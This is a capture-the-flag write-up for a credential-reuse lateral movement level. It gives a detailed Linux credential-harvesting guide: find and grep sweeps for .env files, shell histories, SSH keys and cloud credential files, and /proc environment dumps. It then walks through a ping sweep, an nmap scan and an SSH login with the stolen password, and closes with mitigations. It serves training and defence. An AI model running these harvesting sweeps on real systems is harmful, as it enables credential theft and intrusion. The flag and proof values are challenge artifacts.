# L18 — lm-cred-reuse · The Password Works Everywhere

**Act IV · Lateral Movement · T1078**
**Status:** Solved
**Flag:** `bl_01db3eeb01b5c6c84fa1f3567320fc6f`

---

## Challenge brief

> People reuse credentials, and machines trust each other more than they should. Take
> what you harvested and find where else it still works.

MITRE tag T1078 is "Valid Accounts" — using legitimate credentials (username and
password, or SSH key) obtained during harvesting to authenticate to another system as
if you were the legitimate user. No exploitation needed — the credential is valid, and
the system accepts it.

You land as root on the foothold. A credential is stored somewhere on this box. That
same credential works on boxB's SSH. You SSH in as that user, read the crown secret
from their home directory, and write it to the proof file on the foothold.

---

## Background: why credential reuse is so widespread

Credential reuse is one of the most reliable lateral movement techniques in real
penetration tests, because it exploits human and organizational behaviour rather than
software bugs.

**Why people reuse passwords:** Managing a unique password per system is inconvenient.
Developers, sysadmins, and service accounts often use the same password across multiple
systems — especially internal ones considered "less important" or "not public-facing."

**Why service credentials end up in files:** A script, a deploy pipeline, or a background
job needs to authenticate somewhere. The natural approach is to put the username and
password in a config file the script reads at runtime. This is functional — but it means
the credential is now on disk, readable by anyone who can read that file.

**Why the same credential works on multiple hosts:** Service accounts are often created
with the same username and password on every server in an environment. The deploy user
`svc` on the foothold has the same password as `svc` on boxB — because someone created
both accounts at the same time with the same password, and never rotated them
independently.

---

## Reading `ip addr` output — what each part means

Before starting the credential hunt, we ran `ip addr` to map our network position. This
output appears on every level and is worth understanding fully, because each field tells
you something specific.

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo

2: eth0@if6053805: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 42:c2:d1:f4:1b:75 brd ff:ff:ff:ff:ff:ff
    inet 10.66.113.2/24 brd 10.66.113.255 scope global eth0
```

**Interface numbering (`1:`, `2:`)** — Linux assigns a number to each network interface.
`1` is always `lo` (loopback). `2` is usually the first real network interface.

**Interface name (`lo`, `eth0`)** — the name of the interface.
- `lo` — loopback. Used for traffic within the same host (`127.0.0.1`). Not a real
  network connection.
- `eth0` — the first Ethernet interface. In Docker containers this is always the
  container's connection to the Docker bridge network.
- `eth0@if6053805` — the `@if6053805` suffix is a Docker detail. It means this
  interface is a veth (virtual ethernet) pair, and the other end of the pair is
  interface number 6053805 on the host. You can ignore this in CTF work.

**Flags in angle brackets (`<BROADCAST,MULTICAST,UP,LOWER_UP>`)** — the state of the
interface:
- `UP` — the interface is enabled and active
- `LOWER_UP` — the physical (or virtual) link is connected
- `BROADCAST` — can send to all hosts on the subnet
- `MULTICAST` — can send to multicast groups
- `LOOPBACK` — only on `lo`, means traffic stays on this host

**`mtu 1500`** — Maximum Transmission Unit. The largest packet size this interface
can send, in bytes. 1500 is the standard Ethernet MTU. 65536 on `lo` because loopback
has no physical limit.

**`state UP` / `state UNKNOWN`** — operational state. `UP` means ready. `UNKNOWN` on
`lo` is normal — loopback doesn't have a real link to detect.

**`link/ether 42:c2:d1:f4:1b:75`** — the MAC address (hardware address) of the
interface. Each Docker container gets a randomly generated MAC. Not usually useful in
CTF work.

**`brd ff:ff:ff:ff:ff:ff`** — the broadcast MAC address. All-ones means "send to
everyone on this segment."

**`inet 10.66.113.2/24`** — the IPv4 address. This is the most important line:
- `10.66.113.2` — this machine's IP address
- `/24` — the subnet mask in CIDR notation. `/24` means the first 24 bits are the
  network prefix (`10.66.113`) and the last 8 bits are the host part (`.2`). A `/24`
  has 256 total addresses, 254 usable hosts (`.1` through `.254`).

**`brd 10.66.113.255`** — the broadcast address. Packets sent here go to all hosts on
the `10.66.113.0/24` subnet.

**`scope global`** — this address is globally routable on the network (as opposed to
`scope host` which is loopback-only or `scope link` which is link-local only).

**What to extract from `ip addr` output in one line:** Find the `eth0` interface, read
the `inet` line, note the IP and the `/prefix`. The IP is your address, and the prefix
tells you the scan range.

---

## Where credentials live on Linux — a systematic guide

This is the core skill of T1078 levels. Credentials get placed on disk in many forms
and many locations. The more locations you check, the more credentials you find. Here
they are grouped by type and location.

---

### Category 1: environment files (.env files)

`.env` files are the most common way to store credentials in modern applications. The
convention started with Node.js but has spread to Python, Ruby, PHP, and virtually every
other web framework. The idea: put all configuration (including secrets) in a `.env`
file, read it into the application at startup, and never hardcode credentials in the
source code.

**What they look like:**

```sh
DATABASE_URL=postgres://user:password@host:5432/dbname
DEPLOY_USER=svc
DEPLOY_PASS=033ca233d465ff21
API_KEY=sk-proj-abc123...
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
SECRET_KEY_BASE=a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4
```

**Why they end up in risky locations:** Developers put the `.env` file in the
application directory. Someone copies the application to a server. The `.env` travels
with it. The file is readable by root (or by the application user). An attacker who
compromises that user can read it.

**Where to look:**

```sh
# In application directories
find /opt -name ".env" -o -name "*.env" 2>/dev/null
find /var/www -name ".env" 2>/dev/null
find /home -name ".env" 2>/dev/null
find /root -name ".env" 2>/dev/null
find /srv -name ".env" 2>/dev/null

# Hidden in dotfile directories (this level's credential was here)
find /root/.local -name "*.env" -o -name ".env" 2>/dev/null

# General sweep
find / -name ".env" -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
find / -name "*.env" -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

**In this level:** The credential was at `/root/.local/share/deploy/.env` — inside the
root user's local application data directory. The path `~/.local/share/<app>/` is the
XDG Base Directory standard for per-user application data on Linux. A deploy tool
storing its config there is realistic.

---

### Category 2: shell history files

Shell history records every command typed in a terminal session. This includes commands
that contained credentials inline — `mysql -u root -pSecretPassword`, `curl -u user:pass
https://api.example.com`, `export API_KEY=abc123`.

**Where to look:**

```sh
cat /root/.bash_history 2>/dev/null
cat /root/.ash_history 2>/dev/null    # Alpine/ash shell
cat /home/*/.bash_history 2>/dev/null
cat /home/*/.ash_history 2>/dev/null
cat /home/*/.zsh_history 2>/dev/null
```

**What to look for in history:**
- `mysql -p<password>` or `mysql -u user -pPassword` (MySQL password inline)
- `psql postgresql://user:password@host/db` (PostgreSQL connection string)
- `curl -u user:password` or `curl -H "Authorization: Bearer TOKEN"`
- `ssh user@host` (reveals what hosts this user connects to)
- `export VAR=value` (credentials set as environment variables)
- `scp`, `rsync`, `aws`, `gcloud` commands (may contain credentials or reveal targets)

---

### Category 3: configuration files

Applications store their configuration — including database passwords, API keys, and
service credentials — in various config file formats.

**Common config file locations and formats:**

```sh
# Web application configs
find /var/www -name "config.php" -o -name "wp-config.php" -o -name "config.yml" 2>/dev/null
find /opt -name "config.yml" -o -name "config.yaml" -o -name "settings.py" 2>/dev/null
find /etc -name "*.conf" -newer /etc/hostname 2>/dev/null

# Database connection strings
find / -name "database.yml" -o -name "database.php" 2>/dev/null

# Application-specific locations
cat /opt/*/config/* 2>/dev/null
cat /var/www/*/config/* 2>/dev/null
```

**Common credential patterns in config files:**

```yaml
# YAML (Rails, Django, etc.)
production:
  password: secretpassword
  database_url: postgres://user:pass@host/db

# PHP
define('DB_PASSWORD', 'secretpassword');
$password = 'secretpassword';

# Python
DATABASE_PASSWORD = 'secretpassword'
SECRET_KEY = 'abc123...'

# INI
[database]
password = secretpassword
```

---

### Category 4: SSH keys and SSH configuration

SSH private keys are credentials — they authenticate you to remote hosts without a
password. Finding a private key is as good as finding a password.

**Where to look:**

```sh
# Standard locations for SSH keys
find /root/.ssh -type f 2>/dev/null
find /home/*/.ssh -type f 2>/dev/null
find /opt -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find /etc -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find /var -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Check permissions — a key with 644 is world-readable
ls -la /root/.ssh/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
```

**SSH config files for pivot maps:**

```sh
cat /root/.ssh/config 2>/dev/null
cat /home/*/.ssh/config 2>/dev/null
```

The `~/.ssh/config` file often contains a complete map of where the user SSHes to —
hostnames, usernames, ports, and key files. It's one of the most valuable files to find.

**authorized_keys for key intel:**

```sh
cat /root/.ssh/authorized_keys 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
```

**known_hosts for target discovery:**

```sh
cat /root/.ssh/known_hosts 2>/dev/null
cat /home/*/.ssh/known_hosts 2>/dev/null
```

---

### Category 5: cloud provider credentials

**AWS:**

```sh
# Standard credential files
cat /root/.aws/credentials 2>/dev/null
cat /home/*/.aws/credentials 2>/dev/null

# Also check config files for role ARNs
cat /root/.aws/config 2>/dev/null
```

**GCP:**

```sh
# Application Default Credentials
cat /root/.config/gcloud/application_default_credentials.json 2>/dev/null

# Service account key files
find / -name "*.json" -not -path '/proc/*' 2>/dev/null | xargs grep -l "service_account" 2>/dev/null
```

**Environment variables for cloud credentials:**

```sh
env | grep -iE 'aws|gcp|google|azure|key|secret|token'
```

---

### Category 6: application-specific secret stores

Some applications store credentials in locations specific to their framework or
platform.

**Docker:**

```sh
cat /root/.docker/config.json 2>/dev/null    # registry credentials
find / -name "docker-compose.yml" -o -name "docker-compose.yaml" 2>/dev/null | xargs cat 2>/dev/null
```

**Git:**

```sh
cat /root/.gitconfig 2>/dev/null             # may contain tokens
find / -name ".git-credentials" 2>/dev/null  # stored HTTPS credentials
```

**npm/Node:**

```sh
cat /root/.npmrc 2>/dev/null                 # may contain registry auth tokens
find / -name ".npmrc" 2>/dev/null
```

**Python pip:**

```sh
cat /root/.config/pip/pip.conf 2>/dev/null   # may contain index credentials
```

---

### Category 7: process environments and running services

Credentials passed to processes as environment variables are readable from `/proc` if
you have root:

```sh
# Check all running processes for credential-looking variables
for pid in /proc/[0-9]*/environ; do
  content=$(cat "$pid" 2>/dev/null | tr '\0' '\n')
  echo "$content" | grep -iE 'pass|secret|key|token|api|credential' && echo "  ^ $pid"
done
```

**Check specific processes:**

```sh
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|secret|key|token'
```

---

### The combined sweep — run this on every box you land on

```sh
# Find recently modified non-system files (planted by the challenge)
find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/usr/lib/*' -not -path '/etc/ssl/*' -newer /etc/hostname -type f 2>/dev/null

# .env files
find / -name ".env" -o -name "*.env" 2>/dev/null | grep -v '/proc/' | grep -v '/sys/'

# Config files with credential keywords
grep -r 'password\|secret\|token\|api_key\|access_key' /opt/ /root/ /home/ /var/www/ /etc/ 2>/dev/null | grep -v Binary | grep -v '#'

# Shell history
cat /root/.ash_history /root/.bash_history /home/*/.ash_history /home/*/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | grep -v '/etc/ssl/' | grep -v '/usr/lib/'

# Cloud credentials
cat /root/.aws/credentials /home/*/.aws/credentials 2>/dev/null
find / -name "*.json" 2>/dev/null | xargs grep -l "service_account" 2>/dev/null

# Process environments (requires root)
for pid in /proc/[0-9]*/environ; do cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|secret|key|token|api' | sed "s/^/[$(basename $(dirname $pid))] /"; done
```

---

### Why the `-newer /etc/hostname` trick works

One shortcut to find challenge-planted files without reading everything:

```sh
find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/usr/lib/*' -not -path '/etc/ssl/*' -newer /etc/hostname -type f 2>/dev/null
```

`/etc/hostname` is set when the base Docker image is built — it has the original image
creation timestamp. Files newer than it were added when the challenge was set up for
this session. This filters out all the base OS files and shows only what was planted.

In this level it immediately revealed `/root/.local/share/deploy/.env` — the credential
file we needed.

---

## Enumeration log

### Step 1 — Network situational awareness

```sh
id
ip addr
cat /etc/hosts
```

Result: root, `10.66.113.2/24`, single subnet, no pre-planted hostnames.

**What the ip addr output told us:** `eth0` has `inet 10.66.113.2/24` — we're on the
`10.66.113.0/24` Docker bridge network. The `/24` means 254 usable hosts, all in the
`10.66.113.x` range.

**Decision:** This is a credential reuse level. Find the credential first, then find the
target host.

---

### Step 2 — Find the credential

```sh
find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/usr/lib/*' -not -path '/etc/ssl/*' -newer /etc/hostname -type f 2>/dev/null
```

Result included `/root/.local/share/deploy/.env` — a file not part of the base Alpine
image, planted for this challenge.

```sh
cat /root/.local/share/deploy/.env
```

```
DEPLOY_USER=svc
DEPLOY_PASS=033ca233d465ff21
```

**What this tells us:** A service account called `svc` with password `033ca233d465ff21`.
The name `DEPLOY_USER` suggests this is a deployment service account — likely the same
account exists on boxB for deploying code or configuration.

**Decision:** Try these credentials on boxB's SSH.

---

### Step 3 — Discover boxB

```sh
for i in $(seq 1 254); do ping -c 1 -W 1 10.66.113.$i 2>/dev/null | grep -q "1 packets received" && echo "10.66.113.$i up"; done
```

Result: `.1` (gateway), `.2` (us), `.3` (boxB).

```sh
nmap -p- --min-rate 1000 10.66.113.3
```

Result: port 22 open — SSH is running.

**Decision:** SSH into boxB as `svc` with the harvested password.

---

### Step 4 — Log in to boxB with harvested credentials

```sh
ssh -o StrictHostKeyChecking=no svc@10.66.113.3
# password: 033ca233d465ff21
```

Result: successful login as `svc` on boxB (hostname `644f960cb778`).

**What just happened:** The same `svc` account with the same password exists on boxB.
Whoever set up this environment created both accounts simultaneously and never rotated
the passwords independently. This is credential reuse — one credential opens two doors.

---

### Step 5 — Find the crown secret on boxB

```sh
id
ls -la
cat .crown
```

Result:
```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
-rw------- 1 svc svc 32 Nov 12 15:37 .crown
04e4ddea019061ef295620c9123c4afe
```

The secret was in `.crown` in the svc user's home directory — a hidden file (dotfile)
that `ls` without `-a` would miss.

---

### Step 6 — Write proof on the foothold and verify

```sh
exit     # back to foothold
verify   # grader says: /tmp/.lm-cred-proof
printf '04e4ddea019061ef295620c9123c4afe' > /tmp/.lm-cred-proof && verify
```

**Level solved.**

---

## What the challenge demonstrates

The `.env` file in `/root/.local/share/deploy/` contained a credential for the `svc`
deploy user. That same user and password existed on boxB. No exploit was needed — just
finding the credential and trying it.

This is one of the most common findings in real penetration tests. A developer creates
a service account for deployment automation, puts the credentials in a config file, and
the same credentials are provisioned on every server the deployment pipeline manages.
When an attacker compromises one server and reads the config file, they inherit access
to every other server in that deployment group.

**What would have prevented this:**
- Unique passwords per server for the `svc` account
- Using SSH keys instead of passwords for the deploy user (keys are per-deployment-key,
  not per-server)
- Storing credentials in a secrets manager (Vault, AWS Secrets Manager, GCP Secret
  Manager) rather than a file on disk — the application fetches the credential at
  runtime from the manager, never storing it on disk

---

## Dead ends

None in this level. The `-newer /etc/hostname` sweep immediately surfaced the `.env`
file. The credential worked on the first try.

---

## Carryover findings

None. The credential found in this level was specific to this session's boxB.

---

## Command reference

| Command | What it does |
|---|---|
| `ip addr` | Show network interfaces — read `eth0`'s `inet` line for IP and subnet |
| `find / -not -path '/proc/*' ... -newer /etc/hostname -type f 2>/dev/null` | Find files newer than the base image — isolates challenge-planted files |
| `find / -name ".env" -o -name "*.env" 2>/dev/null` | Find all .env credential files |
| `grep -r 'password\|secret\|token' /opt/ /root/ /home/ 2>/dev/null \| grep -v Binary` | Search file contents for credential keywords |
| `cat /root/.ash_history` | Read root's command history — may contain inline credentials |
| `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` | Find SSH private keys |
| `cat /root/.aws/credentials` | Read AWS credential files |
| `cat /proc/<pid>/environ \| tr '\0' '\n' \| grep -iE 'pass\|secret\|key'` | Read a process's environment for credentials |
| `for i in $(seq 1 254); do ping -c 1 -W 1 10.x.x.$i 2>/dev/null \| grep -q "1 packets received" && echo "$i up"; done` | Ping sweep to find live hosts |
| `nmap -p- --min-rate 1000 <ip>` | Full port scan to find open services |
| `ssh -o StrictHostKeyChecking=no svc@<ip>` | SSH to boxB with the harvested username |
| `ls -la` | List files including hidden dotfiles — `.crown` would be missed without `-a` |
| `printf 'VALUE' > /tmp/.lm-cred-proof && verify` | Write proof and verify |